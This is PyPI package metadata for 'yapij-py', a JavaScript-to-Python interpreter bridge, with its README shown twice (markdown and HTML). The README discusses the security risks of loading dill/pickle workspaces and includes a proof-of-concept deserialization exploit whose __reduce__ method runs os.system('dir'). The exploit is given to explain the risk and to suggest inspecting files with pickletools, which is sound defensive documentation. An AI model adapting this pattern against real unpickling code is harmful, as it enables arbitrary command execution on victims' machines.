{"info": {"author": "Michael Wooley", "author_email": "michael.wooley@us.gt.com", "bugtrack_url": null, "classifiers": ["Development Status :: 3 - Alpha", "Operating System :: OS Independent", "Programming Language :: Python :: 3.7"], "description": "# `yapij-python`: Python-side of `yapij` package.\n\n## Implementation Details\n\nThere are two key challenges that one faces when implementing an interpreter emulator:\n\n1. Catching and processing program output.\n1. Interrupting code before it is completed.\n\nAt the same time, we'd also like:\n\n1. The ability to send other commands to the python process _while code is running._ For example, save a workspace while code is running.\n1. Check on the health of the process with a heartbeat.\n\nThe main ingredients of the solution are:\n\n1. Multi-threading for a main interface, the interpreter, and a heartbeat.\n1. `asyncio` scheduling off the main loop.\n1. Context managers that overwrite `sys.stdout` and `sys.stderr` with an emulator. _Appropriate placement of the context managers are key!_\n\n### Misc. Details\n\n#### Placement of context managers\n\nA context manager that is called within a thread will \"bubble up\" to parent threads so long as it is running. See the [appendix example](#context-managers-in-a-thread). (However, there is no \"bubbling down\" from parent to child threads.)\n\nThis is problematic in our context because the threads will run as long as the context. (Therefore, `Thread.join` is not an option.)\n\nTherefore, we place `catch_output` - the main context manager that formats `print` statements, exceptions, and `sys.stdout` in general - in the child thread `ExecSession`. This thread executes commands sent to the editor.\n\nAll such similar statements in the main thread are also handled by `catch_output` due to the \"bubbling up\" behavior.\n\n### Rejected Alternatives\n\n- Use standard `exec` and `runpy` to excute input:\n  - Built-in module `code` provides `InteractiveInterpreter` and `InteractiveConsole` classes for doing just this.\n  - Running code on instances of these objects still blocks. Therefore, does nothing for the `KeyboardInterrupt` problem.\n  - Also do nothing for the last line print.\n\n## Known Issues and Limitations\n\n### Execution\n\n#### Threading\n\n- The session interpreter runs on its own thread. Therefore, certain applications may not run as expected.\n- For example, the `signal` module cannot run on a non-main thread.\n- Consider flipping around so that \"main\" thread is `ExecSession`.\n\n#### `sys.stdout` and `sys.stderr`\n\n- In order to communicate with the node process, `sys.stdout` and `sys.stderr` are overridden with an instance of a custom class `ZMQIOWrapper`.\n- The custom class is built to emulate the classes underlying `sys.stdout`. In particular, it inherits class `io.TextIOWrapper`.\n- However, full equivelance is not gauranteed at this time.\n- Moreover, attempts to re-route `sys.stdout` from within the interpreter may not work as expected or may fail to revert as expected.\n\n### Security\n\nThe point of this module is to permit _arbitrary code execution_. It is by no means secure.\n\n#### Workspace Manager\n\n- The workspace manager currently saves objects using the `dill` module, which is based on `pickle`\n- We use `dill` because it allows us to preserve the state of a huge range of objects.\n- The problem is that, if it is possible to pickle anything, then it will also be possible to pickle malicious code.\n  - See the useful articles by [Nicolas Lara](https://lincolnloop.com/blog/playing-pickle-security/) and [Kevin London](https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html).\n  - An example of a malicious `dill` exploit can be found in the [appendix](#a-dill-exploit)\n- The current approach is to add a key to each file following the approach outlined [here](https://www.synopsys.com/blogs/software-security/python-pickling/).\n  - This will raise a flag and fail to load if the generated key does not match the data.\n  - **_It cannot protect in cases where someone malicious correctly decodes then re-encodes a file (or puts malicious code in the file to start)._**\n  - Thus, this is best thought of as a way of being protected from code that might be naively injected into the pickled workspace when it is transferred between two known users (i.e. via a poorly-executed [man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack).)\n- Further refinements might included using `pickletools.dis` to inspect files for red flags. (See the [example](#a-dill-exploit) code for what that spits out.)\n  - This will still never be completely secure.\n- Jupyter Notebook stores keys in a separate `db`.\n  - [Docs](https://jupyter-notebook.readthedocs.io/en/stable/security.html#the-details-of-trust)\n  - [Some code references](https://github.com/jupyter/jupyter_core/blob/f1e18b8a52cd526c0cd1402b6041778dd60f20dc/jupyter_core/migrate.py#L16)\n  - Where would it be stored on this module? How is db started?\n\n#### A \"Safe Mode\"?\n\n- It is really hard to do anything like a sandbox for python.\n- In Python 2.3 [`rexec`](https://docs.python.org/2/library/restricted.html) was disabled due to \"various known and not readily fixable security holes.\"\n- Therefore, we take the stance that - instead of trying to offer security some of the time - we will always allow arbitrary execution in the hopes that this keeps users vigilant.\n\n#### Security Best Practices\n\nBest practices for yapij are identical to best practices for running any python code:\n\n- Never load a workspace from someone that you do not know and trust.\n- Never install a python package that you do not know or trust.\n\n## Packaging\n\n- Packaging is carried out with [PyPRI](https://www.python-private-package-index.com/).\n- A new version is compiled by a job (using `.gitlab-ci.yaml`) every time that the a new commit is pushed with version (I think it depends on a tag being added.)\n- Go to CLI to see the jobs.\n- Use `pipreqs yapij` to make `requirements.txt`\n\n### Dependencies\n\nThe main non-standard dependencies are:\n\n- **[`pyzmq`/`zmq`](https://github.com/zeromq/pyzmq)**: \"\u00c3\u02dcMQ is a lightweight and fast messaging implementation.\"\n- **[`msgpack_python`/`msgpack`](https://github.com/msgpack/msgpack-python)**: \"MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON. But it's faster and smaller.\"\n- **[`dill`](https://pypi.org/project/dill/)**: \"dill extends python\u00e2\u20ac\u2122s pickle module for serializing and de-serializing python objects to the majority of the built-in python types.\"\n\nWe also provide custom serialization for `NumPy` arrays and `Pandas` dataframes. Thus, these become dependencies as well.\n\n## About\n\n### Contact\n\nMichael Wooley\n\n[michael.wooley@us.gt.com](mailto:michael.wooley@us.gt.com)\n\n[michaelwooley.github.io](michaelwooley.github.io)\n\n### License\n\nUNLICENSED\n\n(Sorry, not my choice.)\n\n## Appendix\n\n### A `dill` Exploit\n\nDrawn from [Kevin London's _Dangerous Python Functions, Part 2_](https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html)\n\n```python\nimport os\nimport dill\nimport pickletools\n\n# Exploit that we want the target to unpickle\nclass Exploit(object):\n    def __reduce__(self):\n        # Note: this will only list files in your directory.\n        # It is a proof of concept.\n        return (os.system, ('dir',))\n\n\ndef serialize_exploit():\n    shellcode = dill.dumps({'e': Exploit(), 's': dill.dumps})\n    return shellcode\n\n\ndef insecure_deserialize(exploit_code):\n    dill.loads(exploit_code)\n\n\nif __name__ == '__main__':\n    shellcode = serialize_exploit()\n    print('~'*80,'IF I CAN SEE YOUR FILES I CAN USUALLY DELETE THEM AS WELL', '~'*80, sep='\\n')\n    insecure_deserialize(shellcode)\n\n    print('~'*80,'WHAT IF WE MADE USE OF SHELL CODE TO LOOK FOR RED FLAGS LIKE \"REDUCE\"?', '~'*80, sep='\\n')\n    pickletools.dis(shellcode)\n```\n\n### Context managers in a thread\n\n```python\nimport threading\nimport os\nimport sys\nimport contextlib\nimport copy\n\n# Original\nprint_original = copy.copy(__builtins__.print)\n\ndef print_modified(*objects, sep=' ', end='\\n', file=sys.stdout, flush=True):\n  return print_original('[Context]', *objects, sep=sep, end=end, file=file, flush=flush)\n\n@contextlib.contextmanager\ndef catch_output():\n  try:\n    __builtins__.print = print_modified\n    yield\n  finally:\n    __builtins__.print = print_original\n\nclass WorkerThread(threading.Thread):\n\n  def run(self):\n    with catch_output(False):\n      time.sleep(3)\n      print('Inside Context')\n    time.sleep(3)\n    print('Outside Context')\n\nw = WorkerThread()\nw.start()\nprint('Yep')\n```\n\nWill return something like:\n\n```\n[Context] Yep\n[Context] Inside Context\nOutside Context\n```\n\n\n", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/michaelwooley/yapij", "keywords": "", "license": "", "maintainer": "", "maintainer_email": "", "name": "yapij-py", "package_url": "https://pypi.org/project/yapij-py/", "platform": "", "project_url": "https://pypi.org/project/yapij-py/", "project_urls": {"Homepage": "https://github.com/michaelwooley/yapij"}, "release_url": "https://pypi.org/project/yapij-py/999/", "requires_dist": ["dill", "traitlets", "typing", "msgpack-python", "pyzmq"], "requires_python": ">=3.5", "summary": "Python-side of YAPIJ js-to-python interpreter.", "version": "999", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1><code>yapij-python</code>: Python-side of <code>yapij</code> package.</h1>\n<h2>Implementation Details</h2>\n<p>There are two key challenges that one faces when implementing an interpreter emulator:</p>\n<ol>\n<li>Catching and processing program output.</li>\n<li>Interrupting code before it is completed.</li>\n</ol>\n<p>At the same time, we'd also like:</p>\n<ol>\n<li>The ability to send other commands to the python process <em>while code is running.</em> For example, save a workspace while code is running.</li>\n<li>Check on the health of the process with a heartbeat.</li>\n</ol>\n<p>The main ingredients of the solution are:</p>\n<ol>\n<li>Multi-threading for a main interface, the interpreter, and a heartbeat.</li>\n<li><code>asyncio</code> scheduling off the main loop.</li>\n<li>Context managers that overwrite <code>sys.stdout</code> and <code>sys.stderr</code> with an emulator. <em>Appropriate placement of the context managers are key!</em></li>\n</ol>\n<h3>Misc. Details</h3>\n<h4>Placement of context managers</h4>\n<p>A context manager that is called within a thread will \"bubble up\" to parent threads so long as it is running. See the <a href=\"#context-managers-in-a-thread\" rel=\"nofollow\">appendix example</a>. (However, there is no \"bubbling down\" from parent to child threads.)</p>\n<p>This is problematic in our context because the threads will run as long as the context. (Therefore, <code>Thread.join</code> is not an option.)</p>\n<p>Therefore, we place <code>catch_output</code> - the main context manager that formats <code>print</code> statements, exceptions, and <code>sys.stdout</code> in general - in the child thread <code>ExecSession</code>. This thread executes commands sent to the editor.</p>\n<p>All such similar statements in the main thread are also handled by <code>catch_output</code> due to the \"bubbling up\" behavior.</p>\n<h3>Rejected Alternatives</h3>\n<ul>\n<li>Use standard <code>exec</code> and <code>runpy</code> to excute input:\n<ul>\n<li>Built-in module <code>code</code> provides <code>InteractiveInterpreter</code> and <code>InteractiveConsole</code> classes for doing just this.</li>\n<li>Running code on instances of these objects still blocks. Therefore, does nothing for the <code>KeyboardInterrupt</code> problem.</li>\n<li>Also do nothing for the last line print.</li>\n</ul>\n</li>\n</ul>\n<h2>Known Issues and Limitations</h2>\n<h3>Execution</h3>\n<h4>Threading</h4>\n<ul>\n<li>The session interpreter runs on its own thread. Therefore, certain applications may not run as expected.</li>\n<li>For example, the <code>signal</code> module cannot run on a non-main thread.</li>\n<li>Consider flipping around so that \"main\" thread is <code>ExecSession</code>.</li>\n</ul>\n<h4><code>sys.stdout</code> and <code>sys.stderr</code></h4>\n<ul>\n<li>In order to communicate with the node process, <code>sys.stdout</code> and <code>sys.stderr</code> are overridden with an instance of a custom class <code>ZMQIOWrapper</code>.</li>\n<li>The custom class is built to emulate the classes underlying <code>sys.stdout</code>. In particular, it inherits class <code>io.TextIOWrapper</code>.</li>\n<li>However, full equivelance is not gauranteed at this time.</li>\n<li>Moreover, attempts to re-route <code>sys.stdout</code> from within the interpreter may not work as expected or may fail to revert as expected.</li>\n</ul>\n<h3>Security</h3>\n<p>The point of this module is to permit <em>arbitrary code execution</em>. It is by no means secure.</p>\n<h4>Workspace Manager</h4>\n<ul>\n<li>The workspace manager currently saves objects using the <code>dill</code> module, which is based on <code>pickle</code></li>\n<li>We use <code>dill</code> because it allows us to preserve the state of a huge range of objects.</li>\n<li>The problem is that, if it is possible to pickle anything, then it will also be possible to pickle malicious code.\n<ul>\n<li>See the useful articles by <a href=\"https://lincolnloop.com/blog/playing-pickle-security/\" rel=\"nofollow\">Nicolas Lara</a> and <a href=\"https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html\" rel=\"nofollow\">Kevin London</a>.</li>\n<li>An example of a malicious <code>dill</code> exploit can be found in the <a href=\"#a-dill-exploit\" rel=\"nofollow\">appendix</a></li>\n</ul>\n</li>\n<li>The current approach is to add a key to each file following the approach outlined <a href=\"https://www.synopsys.com/blogs/software-security/python-pickling/\" rel=\"nofollow\">here</a>.\n<ul>\n<li>This will raise a flag and fail to load if the generated key does not match the data.</li>\n<li><strong><em>It cannot protect in cases where someone malicious correctly decodes then re-encodes a file (or puts malicious code in the file to start).</em></strong></li>\n<li>Thus, this is best thought of as a way of being protected from code that might be naively injected into the pickled workspace when it is transferred between two known users (i.e. via a poorly-executed <a href=\"https://en.wikipedia.org/wiki/Man-in-the-middle_attack\" rel=\"nofollow\">man-in-the-middle attack</a>.)</li>\n</ul>\n</li>\n<li>Further refinements might included using <code>pickletools.dis</code> to inspect files for red flags. (See the <a href=\"#a-dill-exploit\" rel=\"nofollow\">example</a> code for what that spits out.)\n<ul>\n<li>This will still never be completely secure.</li>\n</ul>\n</li>\n<li>Jupyter Notebook stores keys in a separate <code>db</code>.\n<ul>\n<li><a href=\"https://jupyter-notebook.readthedocs.io/en/stable/security.html#the-details-of-trust\" rel=\"nofollow\">Docs</a></li>\n<li><a href=\"https://github.com/jupyter/jupyter_core/blob/f1e18b8a52cd526c0cd1402b6041778dd60f20dc/jupyter_core/migrate.py#L16\" rel=\"nofollow\">Some code references</a></li>\n<li>Where would it be stored on this module? How is db started?</li>\n</ul>\n</li>\n</ul>\n<h4>A \"Safe Mode\"?</h4>\n<ul>\n<li>It is really hard to do anything like a sandbox for python.</li>\n<li>In Python 2.3 <a href=\"https://docs.python.org/2/library/restricted.html\" rel=\"nofollow\"><code>rexec</code></a> was disabled due to \"various known and not readily fixable security holes.\"</li>\n<li>Therefore, we take the stance that - instead of trying to offer security some of the time - we will always allow arbitrary execution in the hopes that this keeps users vigilant.</li>\n</ul>\n<h4>Security Best Practices</h4>\n<p>Best practices for yapij are identical to best practices for running any python code:</p>\n<ul>\n<li>Never load a workspace from someone that you do not know and trust.</li>\n<li>Never install a python package that you do not know or trust.</li>\n</ul>\n<h2>Packaging</h2>\n<ul>\n<li>Packaging is carried out with <a href=\"https://www.python-private-package-index.com/\" rel=\"nofollow\">PyPRI</a>.</li>\n<li>A new version is compiled by a job (using <code>.gitlab-ci.yaml</code>) every time that the a new commit is pushed with version (I think it depends on a tag being added.)</li>\n<li>Go to CLI to see the jobs.</li>\n<li>Use <code>pipreqs yapij</code> to make <code>requirements.txt</code></li>\n</ul>\n<h3>Dependencies</h3>\n<p>The main non-standard dependencies are:</p>\n<ul>\n<li><strong><a href=\"https://github.com/zeromq/pyzmq\" rel=\"nofollow\"><code>pyzmq</code>/<code>zmq</code></a></strong>: \"\u00c3\u02dcMQ is a lightweight and fast messaging implementation.\"</li>\n<li><strong><a href=\"https://github.com/msgpack/msgpack-python\" rel=\"nofollow\"><code>msgpack_python</code>/<code>msgpack</code></a></strong>: \"MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON. But it's faster and smaller.\"</li>\n<li><strong><a href=\"https://pypi.org/project/dill/\" rel=\"nofollow\"><code>dill</code></a></strong>: \"dill extends python\u00e2\u20ac\u2122s pickle module for serializing and de-serializing python objects to the majority of the built-in python types.\"</li>\n</ul>\n<p>We also provide custom serialization for <code>NumPy</code> arrays and <code>Pandas</code> dataframes. Thus, these become dependencies as well.</p>\n<h2>About</h2>\n<h3>Contact</h3>\n<p>Michael Wooley</p>\n<p><a href=\"mailto:michael.wooley@us.gt.com\">michael.wooley@us.gt.com</a></p>\n<p><a href=\"michaelwooley.github.io\" rel=\"nofollow\">michaelwooley.github.io</a></p>\n<h3>License</h3>\n<p>UNLICENSED</p>\n<p>(Sorry, not my choice.)</p>\n<h2>Appendix</h2>\n<h3>A <code>dill</code> Exploit</h3>\n<p>Drawn from <a href=\"https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html\" rel=\"nofollow\">Kevin London's <em>Dangerous Python Functions, Part 2</em></a></p>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">os</span>\n<span class=\"kn\">import</span> <span class=\"nn\">dill</span>\n<span class=\"kn\">import</span> <span class=\"nn\">pickletools</span>\n\n<span class=\"c1\"># Exploit that we want the target to unpickle</span>\n<span class=\"k\">class</span> <span class=\"nc\">Exploit</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>\n    <span class=\"k\">def</span> <span class=\"nf\">__reduce__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>\n        <span class=\"c1\"># Note: this will only list files in your directory.</span>\n        <span class=\"c1\"># It is a proof of concept.</span>\n        <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">system</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"s1\">'dir'</span><span class=\"p\">,))</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">serialize_exploit</span><span class=\"p\">():</span>\n    <span class=\"n\">shellcode</span> <span class=\"o\">=</span> <span class=\"n\">dill</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">({</span><span class=\"s1\">'e'</span><span class=\"p\">:</span> <span class=\"n\">Exploit</span><span class=\"p\">(),</span> <span class=\"s1\">'s'</span><span class=\"p\">:</span> <span class=\"n\">dill</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">})</span>\n    <span class=\"k\">return</span> <span class=\"n\">shellcode</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">insecure_deserialize</span><span class=\"p\">(</span><span class=\"n\">exploit_code</span><span class=\"p\">):</span>\n    <span class=\"n\">dill</span><span class=\"o\">.</span><span class=\"n\">loads</span><span class=\"p\">(</span><span class=\"n\">exploit_code</span><span class=\"p\">)</span>\n\n\n<span class=\"k\">if</span> <span class=\"vm\">__name__</span> <span class=\"o\">==</span> <span class=\"s1\">'__main__'</span><span class=\"p\">:</span>\n    <span class=\"n\">shellcode</span> <span class=\"o\">=</span> <span class=\"n\">serialize_exploit</span><span class=\"p\">()</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'~'</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">,</span><span class=\"s1\">'IF I CAN SEE YOUR FILES I CAN USUALLY DELETE THEM AS WELL'</span><span class=\"p\">,</span> <span class=\"s1\">'~'</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">,</span> <span class=\"n\">sep</span><span class=\"o\">=</span><span class=\"s1\">'</span><span class=\"se\">\\n</span><span class=\"s1\">'</span><span class=\"p\">)</span>\n    <span class=\"n\">insecure_deserialize</span><span class=\"p\">(</span><span class=\"n\">shellcode</span><span class=\"p\">)</span>\n\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'~'</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">,</span><span class=\"s1\">'WHAT IF WE MADE USE OF SHELL CODE TO LOOK FOR RED FLAGS LIKE \"REDUCE\"?'</span><span class=\"p\">,</span> <span class=\"s1\">'~'</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">,</span> <span class=\"n\">sep</span><span class=\"o\">=</span><span class=\"s1\">'</span><span class=\"se\">\\n</span><span class=\"s1\">'</span><span class=\"p\">)</span>\n    <span class=\"n\">pickletools</span><span class=\"o\">.</span><span class=\"n\">dis</span><span class=\"p\">(</span><span class=\"n\">shellcode</span><span class=\"p\">)</span>\n</pre>\n<h3>Context managers in a thread</h3>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">threading</span>\n<span class=\"kn\">import</span> <span class=\"nn\">os</span>\n<span class=\"kn\">import</span> <span class=\"nn\">sys</span>\n<span class=\"kn\">import</span> <span class=\"nn\">contextlib</span>\n<span class=\"kn\">import</span> <span class=\"nn\">copy</span>\n\n<span class=\"c1\"># Original</span>\n<span class=\"n\">print_original</span> <span class=\"o\">=</span> <span class=\"n\">copy</span><span class=\"o\">.</span><span class=\"n\">copy</span><span class=\"p\">(</span><span class=\"n\">__builtins__</span><span class=\"o\">.</span><span class=\"n\">print</span><span class=\"p\">)</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">print_modified</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"n\">objects</span><span class=\"p\">,</span> <span class=\"n\">sep</span><span class=\"o\">=</span><span class=\"s1\">' '</span><span class=\"p\">,</span> <span class=\"n\">end</span><span class=\"o\">=</span><span class=\"s1\">'</span><span class=\"se\">\\n</span><span class=\"s1\">'</span><span class=\"p\">,</span> <span class=\"n\">file</span><span class=\"o\">=</span><span class=\"n\">sys</span><span class=\"o\">.</span><span class=\"n\">stdout</span><span class=\"p\">,</span> <span class=\"n\">flush</span><span class=\"o\">=</span><span class=\"kc\">True</span><span class=\"p\">):</span>\n  <span class=\"k\">return</span> <span class=\"n\">print_original</span><span class=\"p\">(</span><span class=\"s1\">'[Context]'</span><span class=\"p\">,</span> <span class=\"o\">*</span><span class=\"n\">objects</span><span class=\"p\">,</span> <span class=\"n\">sep</span><span class=\"o\">=</span><span class=\"n\">sep</span><span class=\"p\">,</span> <span class=\"n\">end</span><span class=\"o\">=</span><span class=\"n\">end</span><span class=\"p\">,</span> <span class=\"n\">file</span><span class=\"o\">=</span><span class=\"n\">file</span><span class=\"p\">,</span> <span class=\"n\">flush</span><span class=\"o\">=</span><span class=\"n\">flush</span><span class=\"p\">)</span>\n\n<span class=\"nd\">@contextlib</span><span class=\"o\">.</span><span class=\"n\">contextmanager</span>\n<span class=\"k\">def</span> <span class=\"nf\">catch_output</span><span class=\"p\">():</span>\n  <span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">__builtins__</span><span class=\"o\">.</span><span class=\"n\">print</span> <span class=\"o\">=</span> <span class=\"n\">print_modified</span>\n    <span class=\"k\">yield</span>\n  <span class=\"k\">finally</span><span class=\"p\">:</span>\n    <span class=\"n\">__builtins__</span><span class=\"o\">.</span><span class=\"n\">print</span> <span class=\"o\">=</span> <span class=\"n\">print_original</span>\n\n<span class=\"k\">class</span> <span class=\"nc\">WorkerThread</span><span class=\"p\">(</span><span class=\"n\">threading</span><span class=\"o\">.</span><span class=\"n\">Thread</span><span class=\"p\">):</span>\n\n  <span class=\"k\">def</span> <span class=\"nf\">run</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>\n    <span class=\"k\">with</span> <span class=\"n\">catch_output</span><span class=\"p\">(</span><span class=\"kc\">False</span><span class=\"p\">):</span>\n      <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">sleep</span><span class=\"p\">(</span><span class=\"mi\">3</span><span class=\"p\">)</span>\n      <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Inside Context'</span><span class=\"p\">)</span>\n    <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">sleep</span><span class=\"p\">(</span><span class=\"mi\">3</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Outside Context'</span><span class=\"p\">)</span>\n\n<span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"n\">WorkerThread</span><span class=\"p\">()</span>\n<span class=\"n\">w</span><span class=\"o\">.</span><span class=\"n\">start</span><span class=\"p\">()</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Yep'</span><span class=\"p\">)</span>\n</pre>\n<p>Will return something like:</p>\n<pre><code>[Context] Yep\n[Context] Inside Context\nOutside Context\n</code></pre>\n\n          </div>"}, "last_serial": 4573332, "releases": {"999": [{"comment_text": "", "digests": {"md5": "0f5494bbdd95d689b886d17f49f3e4b0", "sha256": "0d9ec4601dd23c4360dd495f8f05417460a9b5237abda6045ab197505f17d8fb"}, "downloads": -1, "filename": "yapij_py-999-py3-none-any.whl", "has_sig": false, "md5_digest": "0f5494bbdd95d689b886d17f49f3e4b0", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.5", "size": 27748, "upload_time": "2018-12-07T21:02:36", "upload_time_iso_8601": "2018-12-07T21:02:36.717746Z", "url": "https://files.pythonhosted.org/packages/1a/dc/414d8232d9fc9b99c4c243034719e27b510c7c6b762fdfb04a72173fb5c1/yapij_py-999-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "1c482af3f680ce4a7cc3ec1630bc3f3d", "sha256": "14ed3751adbfb48379e15e1729fb781ac1bd56788373526ae9b9325d1ccfb527"}, "downloads": -1, "filename": "yapij-py-999.tar.gz", "has_sig": false, "md5_digest": "1c482af3f680ce4a7cc3ec1630bc3f3d", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.5", "size": 26349, "upload_time": "2018-12-07T21:02:38", "upload_time_iso_8601": "2018-12-07T21:02:38.728896Z", "url": "https://files.pythonhosted.org/packages/32/64/18b20c6cd6be2d54d8e11b92cde88597c26e91e5d5ded9684d9d88162b20/yapij-py-999.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "0f5494bbdd95d689b886d17f49f3e4b0", "sha256": "0d9ec4601dd23c4360dd495f8f05417460a9b5237abda6045ab197505f17d8fb"}, "downloads": -1, "filename": "yapij_py-999-py3-none-any.whl", "has_sig": false, "md5_digest": "0f5494bbdd95d689b886d17f49f3e4b0", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.5", "size": 27748, "upload_time": "2018-12-07T21:02:36", "upload_time_iso_8601": "2018-12-07T21:02:36.717746Z", "url": "https://files.pythonhosted.org/packages/1a/dc/414d8232d9fc9b99c4c243034719e27b510c7c6b762fdfb04a72173fb5c1/yapij_py-999-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "1c482af3f680ce4a7cc3ec1630bc3f3d", "sha256": "14ed3751adbfb48379e15e1729fb781ac1bd56788373526ae9b9325d1ccfb527"}, "downloads": -1, "filename": "yapij-py-999.tar.gz", "has_sig": false, "md5_digest": "1c482af3f680ce4a7cc3ec1630bc3f3d", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.5", "size": 26349, "upload_time": "2018-12-07T21:02:38", "upload_time_iso_8601": "2018-12-07T21:02:38.728896Z", "url": "https://files.pythonhosted.org/packages/32/64/18b20c6cd6be2d54d8e11b92cde88597c26e91e5d5ded9684d9d88162b20/yapij-py-999.tar.gz", "yanked": false}], "timestamp": "Fri May  8 03:23:02 2020"}